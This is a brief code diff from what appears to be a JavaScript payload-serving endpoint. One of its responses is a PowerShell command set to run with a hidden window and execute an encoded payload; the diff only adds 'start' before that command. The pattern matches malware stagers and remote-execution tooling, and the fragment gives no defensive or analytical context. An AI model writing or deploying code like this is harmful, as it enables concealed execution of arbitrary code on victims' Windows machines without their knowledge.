@@ -39,7 +39,7 @@ Run-The-Module
         return res.send(encodePayload(payload))
     }
 
-    res.send(`powershell -WindowStyle Hidden -c "${encodePayload(payload)}"`)
+    res.send(`start powershell -WindowStyle Hidden -c "${encodePayload(payload)}"`)
 })
 
 function encodePayload(code) {
